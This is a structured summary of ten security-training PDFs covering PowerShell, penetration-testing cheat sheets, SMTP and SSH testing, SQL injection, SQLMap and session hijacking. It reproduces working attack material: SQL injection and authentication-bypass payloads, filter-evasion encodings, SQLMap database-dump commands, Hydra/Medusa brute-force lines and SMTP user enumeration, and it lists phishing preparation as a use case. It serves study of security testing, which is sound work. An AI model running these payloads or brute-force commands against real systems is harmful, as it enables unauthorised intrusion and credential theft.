# Batch 5 PDF Analysis: PowerShell, SQL Injection & SSH Security

**Analysis Date:** January 2, 2026  
**Total PDFs Analyzed:** 10

---

## 1. PowerShell_Scripting_Fundamentals.pdf

### Main Topic/Focus Area
Comprehensive guide to PowerShell scripting for automation and security operations, covering variables, operators, control structures, and scripting best practices.

### Key Techniques, Tools, or Commands Covered
- **Variables & Data Types:**
  - Variable declaration with `$` prefix
  - Type casting: `[int]`, `[string]`, `[datetime]`, `[array]`, `[hashtable]`
  - Automatic variables: `$_`, `$?`, `$Error`, `$null`, `$PSScriptRoot`
  - Environment variables: `$env:PATH`, `$env:PSModulePath`

- **Operators:**
  - Arithmetic: `+`, `-`, `*`, `/`, `%`
  - Comparison: `-eq`, `-ne`, `-lt`, `-gt`, `-le`, `-ge`, `-like`, `-match`
  - Assignment: `=`, `+=`, `-=`, `*=`, `/=`, `++`, `--`
  - Logical: `-and`, `-or`, `-not`, `!`, `-xor`

- **Control Structures:**
  - Conditionals: `if/elseif/else`, `switch`
  - Loops: `ForEach-Object`, `foreach`, `while`, `for`, `do-until`, `do-while`
  - Flow control: `break`, `continue`

- **Variable Scopes:**
  - `$local:`, `$script:`, `$global:`

### Target Audience
**Beginner to Intermediate** - Suitable for system administrators, security professionals, and DevOps engineers learning PowerShell automation.

### Practical Workflows
1. Setting up variables with proper scoping
2. Processing files in directories with `ForEach-Object`
3. User input handling with `Read-Host` and `switch` statements
4. Regex pattern matching with `-match` and `-Regex`
5. File content processing with `-File` parameter

### Prerequisites
- Windows operating system or PowerShell Core
- Basic understanding of command-line interfaces
- Familiarity with programming concepts

### Common Use Cases
- Security automation scripts
- System administration tasks
- Log file processing
- User enumeration and management
- Penetration testing automation on Windows

---

## 2. Quick Pentest Guide.pdf

### Main Topic/Focus Area
Rapid reference cheat sheet for penetration testing covering information gathering, scanning, exploitation, and post-exploitation phases.

### Key Techniques, Tools, or Commands Covered
- **Directory Busting:**
  ```bash
  gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/
  ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/
  ```

- **VHOST Enumeration:**
  ```bash
  gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/
  ffuf -u http://example.com -w /usr/share/seclists/Discovery/DNS/
  ```

- **DNS Enumeration:**
  - Record types: A, AAAA, MX, NS, CNAME, TXT, SOA
  - Tools: `dig`, `host`, `nslookup`, `dnsrecon`, `dnsenum`
  - Zone transfer testing

- **Host Discovery:**
  ```bash
  netdiscover -i eth0
  nmap -sn 192.168.18.1/24
  arp-scan -l
  ```

- **Service Discovery:**
  ```bash
  nmap -sS -sV 192.168.18.1/24
  nikto -h http://192.168.18.73
  nmap --script=banner 10.129.228.159
  ```

- **Password Brute Force:**
  ```bash
  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://target
  ```

- **Passive Reconnaissance:**
  - Digital certificate search: crt.sh, Censys, Entrust

### Target Audience
**Intermediate** - Designed for OSCP candidates, CTF players, and penetration testers needing quick command references.

### Practical Workflows
1. Subnet discovery → Host enumeration → Port scanning → Service identification
2. Web reconnaissance → Directory busting → VHOST discovery
3. DNS enumeration → Zone transfer → Subdomain discovery
4. Credential brute forcing → Post-exploitation

### Prerequisites
- Kali Linux or similar pentesting distribution
- SecLists wordlists installed
- Basic networking knowledge

### Common Use Cases
- OSCP/CEH exam preparation
- CTF competitions
- Quick reference during pentests
- Automated reconnaissance scripts

---

## 3. SMTP Pentest.pdf

### Main Topic/Focus Area
Comprehensive SMTP penetration testing guide covering protocol architecture, vulnerabilities, exploitation techniques, and security hardening.

### Key Techniques, Tools, or Commands Covered
- **Banner Grabbing:**
  ```bash
  telnet <target_ip> 25
  nc <target_ip> 25
  nmap -sV -p 25 <target_ip>
  ```

- **User Enumeration:**
  - VRFY command: `VRFY admin@example.com`
  - EXPN command: `EXPN staff@example.com`
  - RCPT TO enumeration
  
- **Automated Enumeration:**
  ```bash
  # Metasploit
  use auxiliary/scanner/smtp/smtp_enum
  set RHOSTS <target_ip>
  set USER_FILE /path/to/usernames.txt
  run
  
  # Nmap
  nmap --script smtp-enum-users -p 25 <target_ip>
  
  # smtp-user-enum
  smtp-user-enum -M VRFY -U /path/to/userlist.txt -t <target_ip>
  ```

- **Open Relay Detection:**
  ```bash
  nmap -p 25 --script smtp-open-relay 192.168.1.100
  ```

- **Brute Force Attacks:**
  ```bash
  hydra -l user -P /path/to/passwords.txt smtp://<target_ip> -V
  medusa -h <target_ip> -u user -P /path/to/passwords.txt -M smtp
  ```

- **Email Security Protocols:**
  - SPF (Sender Policy Framework)
  - DKIM (DomainKeys Identified Mail)
  - DMARC (Domain-based Message Authentication)
  - STARTTLS configuration

### Target Audience
**Intermediate to Advanced** - Security professionals conducting email server assessments and infrastructure penetration tests.

### Practical Workflows
1. Banner grabbing → Version identification → CVE research
2. User enumeration (VRFY/EXPN/RCPT TO) → Valid email harvesting
3. Open relay testing → Spam/phishing capability assessment
4. Brute force authentication → Credential compromise
5. Security configuration review → SPF/DKIM/DMARC validation

### Prerequisites
- Understanding of email protocols (SMTP, POP3, IMAP)
- Network security fundamentals
- Metasploit basics
- DNS configuration knowledge

### Common Use Cases
- Email server security assessments
- Phishing campaign preparation
- Internal penetration testing
- Compliance auditing (email security)

---

## 4. SQL Injection.pdf

### Main Topic/Focus Area
Comprehensive SQL injection (SQLi) vulnerability guide covering attack types, detection methods, exploitation techniques, bypass methods, and prevention strategies.

### Key Techniques, Tools, or Commands Covered
- **SQLi Types:**
  - In-band: Error-based, Union-based
  - Blind: Boolean-based, Time-based
  - Out-of-band (OOB)

- **Detection Methods:**
  - Special characters: `'`, `"`, `#`, `;`, `/`, `)`
  - Logic testing: `1 or 1=1`, `1 and 1=2`
  - Arithmetic testing: `id=1/1`, `id=1/0`
  - Unicode characters: U+0027, U+02B9

- **Attack Payloads:**
  ```sql
  -- Union-based
  1 UNION SELECT username, password FROM users
  
  -- Error-based
  1' AND 1=CONVERT(int, (SELECT @@version))--
  
  -- Time-based blind
  1 AND IF(1=1, SLEEP(5), 0)--
  
  -- Authentication bypass
  ' OR 1=1 --
  admin'--
  ```

- **Bypass Techniques:**
  - Hexadecimal encoding: `0x4865727020446572706572`
  - Comment injection: `/**/or/**/1`
  - Case variation: `SeLeCt`
  - Double encoding: `%2553%2545%254c%2545%2543%2554`
  - Null byte injection: `%00SELECT`

### Target Audience
**Beginner to Intermediate** - Web application security testers, bug bounty hunters, and developers learning about SQL injection vulnerabilities.

### Practical Workflows
1. Input field testing with special characters
2. Error message analysis for database type identification
3. Column enumeration with UNION attacks
4. Data extraction through blind techniques
5. Authentication bypass for admin access

### Prerequisites
- Basic SQL knowledge
- Understanding of web applications
- HTTP request/response concepts
- Browser developer tools familiarity

### Common Use Cases
- Web application penetration testing
- Bug bounty hunting
- Security code review
- Developer security awareness training

---

## 5. SQLMap_Database_Pentesting.pdf

### Main Topic/Focus Area
Complete SQLMap tutorial for automated SQL injection detection and exploitation, covering database enumeration, data extraction, and advanced targeting options.

### Key Techniques, Tools, or Commands Covered
- **Database Enumeration:**
  ```bash
  # Enumerate databases
  sqlmap -u "http://target/page.php?id=1" --dbs --batch
  
  # Enumerate tables
  sqlmap -u "http://target/page.php?id=1" -D database_name --tables --batch
  
  # Enumerate columns
  sqlmap -u "http://target/page.php?id=1" -D database_name -T table_name --columns --batch
  
  # Dump data
  sqlmap -u "http://target/page.php?id=1" -D database_name -T table_name --dump --batch
  
  # Dump all
  sqlmap -u "http://target/page.php?id=1" -D database_name --dump-all --batch
  ```

- **Target Options:**
  - URL targeting: `-u <URL>`
  - Log file targeting: `-l /path/to/logfile`
  - Bulk file targeting: `-m /path/to/bulkfile.txt`
  - Google Dorks: `-g "inurl:page.php?id="`
  - HTTP request file: `-r /path/to/request.txt`

- **Supported Databases:**
  - MySQL, Oracle, PostgreSQL, Microsoft SQL Server
  - Microsoft Access, IBM DB2, SQLite, Firebird
  - Sybase, SAP MaxDB, HSQLDB, Informix

- **SQLi Techniques Supported:**
  - Boolean-based blind
  - Time-based blind
  - Error-based
  - UNION query-based
  - Stacked queries
  - Out-of-band

### Target Audience
**Beginner to Intermediate** - Penetration testers learning automated SQL injection exploitation.

### Practical Workflows
1. Identify vulnerable parameter → Run SQLMap with `--dbs`
2. Select target database → Enumerate tables with `--tables`
3. Identify interesting tables → Enumerate columns
4. Extract sensitive data → Dump credentials
5. Use Burp Suite to capture requests → Feed to SQLMap via `-r`

### Prerequisites
- Kali Linux or Python environment
- Basic SQL knowledge
- Understanding of HTTP parameters
- Burp Suite for request capture

### Common Use Cases
- Automated SQL injection exploitation
- Database credential extraction
- Web application penetration testing
- Security assessment automation

---

## 6. SQLi.pdf

### Main Topic/Focus Area
Brief SQL injection reference (appears to be a minimal guide from codelivly.com).

### Key Techniques, Tools, or Commands Covered
- Basic SQL injection concepts
- Limited content extracted

### Target Audience
**Beginner** - Quick reference material.

### Notes
This PDF appears to have minimal extractable text content. Consider using the more comprehensive "SQL Injection.pdf" or "SQLMap_Database_Pentesting.pdf" for detailed SQL injection information.

---

## 7. SSH Access Through Keys.pdf

### Main Topic/Focus Area
Complete guide to SSH key-based authentication setup, configuration, and security best practices for secure remote server access.

### Key Techniques, Tools, or Commands Covered
- **Key Generation:**
  ```bash
  ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
  ```

- **Key Deployment:**
  ```bash
  # Automated
  ssh-copy-id username@remote_server
  
  # Manual
  cat ~/.ssh/id_rsa.pub
  # Paste into ~/.ssh/authorized_keys on server
  ```

- **SSH Config File (~/.ssh/config):**
  ```
  Host server1
      HostName remote_server_1
      User username
      IdentityFile ~/.ssh/id_rsa
      Port 22
  ```

- **Permission Management:**
  ```bash
  chmod 600 ~/.ssh/id_rsa
  chmod 700 ~/.ssh
  chmod 600 ~/.ssh/authorized_keys
  ```

- **SSH Agent:**
  ```bash
  ssh-add ~/.ssh/id_rsa
  ```

- **Debugging:**
  ```bash
  ssh -v username@remote_server
  ```

- **Key Usage Restrictions:**
  ```
  command="/path/to/command" ssh-rsa AAAAB3... user@host
  ```

### Target Audience
**Beginner to Intermediate** - System administrators, DevOps engineers, and developers setting up secure SSH access.

### Practical Workflows
1. Generate RSA 4096-bit key pair with passphrase
2. Copy public key to remote server
3. Configure SSH config file for multiple servers
4. Set proper file permissions
5. Add keys to SSH agent for session persistence

### Prerequisites
- Linux/macOS/Windows with OpenSSH
- Remote server access
- Basic command line knowledge

### Common Use Cases
- Secure server administration
- CI/CD pipeline automation
- DevOps infrastructure management
- Passwordless authentication setup

---

## 8. SSH_Pentesting.pdf

### Main Topic/Focus Area
Quick reference cheat sheet for SSH penetration testing covering enumeration, brute forcing, exploitation, and post-exploitation techniques.

### Key Techniques, Tools, or Commands Covered
- **SSH Enumeration:**
  ```bash
  nmap -p 22 --script ssh2-enum-algos <target-ip>
  nmap -sV -p 22 --script ssh-hostkey <target-ip>
  ssh-audit <target-ip>
  nc <target-ip> 22  # Banner grabbing
  ```

- **Brute Force Attacks:**
  ```bash
  hydra -l <username> -P <password_list> ssh://<target-ip>
  medusa -h <target-ip> -u <username> -P <password_list> -M ssh
  ```

- **Password Spraying:**
  ```bash
  hydra -L <user_list> -p <common_password> ssh://<target-ip>
  ```

- **Key-Based Authentication:**
  ```bash
  ssh -i <private_key> <username>@<target-ip>
  ```

- **Port Forwarding/Tunneling:**
  ```bash
  # Local port forwarding
  ssh -L <local-port>:<remote-host>:<remote-port> <username>@<target-ip>
  
  # Remote port forwarding
  ssh -R <remote-port>:<local-host>:<local-port> <username>@<target-ip>
  
  # ProxyJump for IP whitelisting bypass
  ssh -J <user1>@<jump_host> <user2>@<target-host>
  ```

- **Post-Exploitation:**
  ```bash
  sudo -l  # Check privilege escalation
  # Check ~/.ssh/ for keys and sensitive data
  ```

- **Exploit Research:**
  ```bash
  searchsploit openssh <version>
  ```

### Target Audience
**Intermediate** - Penetration testers and red teamers targeting SSH services.

### Practical Workflows
1. Banner grabbing → Version identification → Exploit search
2. Algorithm enumeration → Weak configuration detection
3. Credential brute forcing → Access gained
4. SSH tunneling for pivoting → Internal network access
5. Key harvesting → Lateral movement

### Prerequisites
- Kali Linux or pentesting environment
- Hydra, Medusa, Nmap
- ssh-audit tool
- Metasploit knowledge

### Common Use Cases
- SSH service security assessments
- Internal network penetration testing
- Lateral movement during engagements
- SSH configuration auditing

---

## 9. Scanning Tools.pdf

### Main Topic/Focus Area
Comprehensive overview of security scanning tools categorized by purpose: network scanning, vulnerability scanning, web application scanning, wireless scanning, and malware detection.

### Key Techniques, Tools, or Commands Covered

#### Network Scanning Tools:
| Tool | Purpose | Example Command |
|------|---------|-----------------|
| **Nmap** | Network discovery, security auditing | `nmap -A -T4 target_ip` |
| **Masscan** | High-speed port scanning | `masscan -p80 192.168.1.0/24 --rate=1000` |
| **Advanced IP Scanner** | Device detection and management | GUI-based |

#### Vulnerability Scanning Tools:
| Tool | Purpose | Platform |
|------|---------|----------|
| **Nessus** | Comprehensive vulnerability assessment | Windows, macOS, Linux |
| **OpenVAS** | Open-source vulnerability scanning | Linux, Docker |
| **Qualys** | Cloud-based vulnerability management | Cloud |

#### Web Application Scanning Tools:
| Tool | Purpose | Key Features |
|------|---------|--------------|
| **Burp Suite** | Web app penetration testing | HTTP proxy, automated scanning |
| **OWASP ZAP** | Open-source web security scanner | CI/CD integration |
| **Acunetix** | Commercial web vulnerability scanner | OWASP Top 10 detection |

#### Wireless Scanning Tools:
| Tool | Purpose | Capabilities |
|------|---------|--------------|
| **Aircrack-ng** | Wireless network penetration testing | WPA/WPA2 cracking |
| **Kismet** | Wireless network detection | Passive scanning |
| **Wireshark** | Network protocol analysis | Packet capture/decode |

#### Malware/Exploit Tools:
| Tool | Purpose |
|------|---------|
| **ClamAV** | Open-source malware scanning |
| **Metasploit Framework** | Exploit development and execution |

### Target Audience
**Beginner to Intermediate** - Security professionals building their toolkit and understanding available security scanning options.

### Practical Workflows
1. Network discovery (Nmap/Masscan) → Vulnerability scanning (Nessus/OpenVAS)
2. Web app enumeration → Burp Suite/ZAP scanning → Vulnerability exploitation
3. Wireless assessment → Aircrack-ng for WPA testing
4. Continuous monitoring → Qualys/Nessus scheduled scans

### Prerequisites
- Linux operating system (recommended)
- Basic networking knowledge
- Understanding of security concepts
- Administrative access for installation

### Common Use Cases
- Penetration testing toolkit building
- Vulnerability management programs
- Security assessment planning
- Tool selection for specific scenarios

---

## 10. Session Fixation and Hijacking.pdf

### Main Topic/Focus Area
Comprehensive guide to web session security covering session management concepts, session fixation attacks, session hijacking techniques, and prevention strategies.

### Key Techniques, Tools, or Commands Covered

#### Session Concepts:
- Session ID generation and management
- Session storage mechanisms (cookies, URLs)
- Session lifecycle (creation, tracking, termination)

#### Session Fixation Attack:
1. Attacker creates session and obtains session ID
2. Attacker sends fixed session ID to victim
3. Victim authenticates with attacker's session ID
4. Attacker hijacks authenticated session

#### Session Hijacking Techniques:
- **Network Sniffing:** Intercepting traffic to capture session IDs
- **Cross-Site Scripting (XSS):** Injecting scripts to steal cookies
- **Man-in-the-Middle (MITM):** Intercepting communications

#### Session Management Vulnerabilities:
| Attack Type | Description |
|-------------|-------------|
| Session Fixation | Forcing user to use known session ID |
| Session Hijacking | Stealing existing session ID |
| CSRF | Forcing authenticated actions |
| Session Replay | Reusing captured session tokens |
| Insecure Session ID | Predictable/weak session generation |
| Session Timeout Issues | Indefinite session validity |
| Exposed Cookies | Missing Secure/HttpOnly attributes |

#### Prevention Measures:
- Regenerate session IDs after login
- Use `HttpOnly`, `Secure`, and `SameSite` cookie attributes
- Implement HTTPS everywhere
- Set appropriate session timeouts
- Strong random session ID generation
- Input validation to prevent XSS

### Target Audience
**Intermediate** - Web developers, security testers, and application security professionals.

### Practical Workflows
1. Identify session management mechanism
2. Test session ID regeneration on login
3. Check cookie security attributes
4. Attempt session fixation attacks
5. Test for XSS vulnerabilities that could steal sessions
6. Verify session timeout behavior

### Prerequisites
- Web application security basics
- Understanding of HTTP cookies
- Browser developer tools familiarity
- Basic JavaScript knowledge

### Common Use Cases
- Web application security testing
- Secure session management implementation
- OWASP compliance verification
- Security code review

---

## Summary Statistics

| PDF | Pages | Difficulty | Primary Focus |
|-----|-------|------------|---------------|
| PowerShell Scripting Fundamentals | 31 | Beginner-Intermediate | Scripting/Automation |
| Quick Pentest Guide | 17 | Intermediate | Penetration Testing Reference |
| SMTP Pentest | 21 | Intermediate-Advanced | Email Server Security |
| SQL Injection | 21 | Beginner-Intermediate | Web Application Security |
| SQLMap Database Pentesting | 25 | Beginner-Intermediate | Automated SQLi Exploitation |
| SQLi | 10 | Beginner | SQL Injection Basics |
| SSH Access Through Keys | 6 | Beginner-Intermediate | Secure Authentication |
| SSH Pentesting | 3 | Intermediate | SSH Security Testing |
| Scanning Tools | 8 | Beginner-Intermediate | Security Tool Overview |
| Session Fixation and Hijacking | 11 | Intermediate | Web Session Security |

---

## Recommended Learning Path

### For Web Application Security:
1. SQL Injection.pdf → SQLMap_Database_Pentesting.pdf → Session Fixation and Hijacking.pdf

### For Network/Infrastructure Security:
1. Scanning Tools.pdf → Quick Pentest Guide.pdf → SMTP Pentest.pdf

### For SSH/Remote Access:
1. SSH Access Through Keys.pdf → SSH_Pentesting.pdf

### For Windows/PowerShell:
1. PowerShell_Scripting_Fundamentals.pdf → (combine with Windows Privilege Escalation guides)

---

## Key Tools Referenced Across All PDFs

| Category | Tools |
|----------|-------|
| **Network Scanning** | Nmap, Masscan, Netdiscover, arp-scan |
| **Web Scanning** | Burp Suite, OWASP ZAP, Nikto, Gobuster, FFUF |
| **SQL Injection** | SQLMap, manual techniques |
| **Password Cracking** | Hydra, Medusa, John the Ripper |
| **SMTP Testing** | Metasploit, smtp-user-enum, Nmap scripts |
| **SSH Testing** | ssh-audit, Hydra, Nmap SSH scripts |
| **Vulnerability Scanning** | Nessus, OpenVAS, Qualys |
